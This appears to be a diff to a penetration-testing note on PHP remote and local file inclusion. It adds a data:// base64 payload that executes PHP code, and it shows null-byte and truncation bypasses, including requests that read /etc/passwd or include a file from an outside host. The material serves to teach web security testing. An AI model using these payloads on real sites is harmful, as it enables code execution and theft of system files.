@@ -30,11 +30,17 @@ So when the victim-server includes this file it will automatically execute the c
 
 ## Data Filters
 
+This only applies for PHP &gt; 5.2 with allow\\_url\\_include enabled.  By providing a php script encoded within base64, we can use the data stream filter to potentially execute PHP code in the event of an RFI.  The below is an encoded `phpinfo()`:
+
+```
+http://example.com/index.php?file=data://text/plain;base64,PD8gcGhwaW5mbygpOyA/Pg==
+```
+
 ## PHP Input
 
 ## Fixing Extensions
 
-Before php version 5.3 add the nullbyte `%00` to avoid appending `.php` and/or terminate the string to bypass url filtering. 
+Before php version 5.3 add the nullbyte `%00` to avoid appending `.php` and/or terminate the string to bypass url filtering.
 
 If it does not work you can also add a `?`, this way the rest will be interpreted as url parameters.
 
@@ -44,6 +50,10 @@ Truncation of the string can also work depending on any environments this may be
 http://example.com/index.php?page=/etc/passwd..............................
 http://example.com/index.php?page=http://mysite.com/AAAAAAAAAAAAAAAAAAAAAAAAAAAA.php
 ```
+
+## References
+
+[https://www.idontplaydarts.com/2011/03/php-remote-file-inclusion-command-shell-using-data-stream/](https://www.idontplaydarts.com/2011/03/php-remote-file-inclusion-command-shell-using-data-stream/)
 
 
 
